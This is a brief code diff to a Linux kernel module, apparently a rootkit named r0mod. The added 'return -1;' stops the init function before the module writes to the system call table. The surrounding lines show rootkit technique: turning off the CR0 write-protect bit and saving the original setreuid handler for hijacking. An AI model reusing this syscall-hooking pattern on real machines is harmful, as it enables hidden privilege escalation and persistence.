@@ -92,6 +92,8 @@ static int __init r0mod_init(void)
 
     printk("sys_call_table hooked @ %lx\n", (unsigned long)syscall_table);
 
+    return -1;
+
     write_cr0(read_cr0() & (~0x10000));
 
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
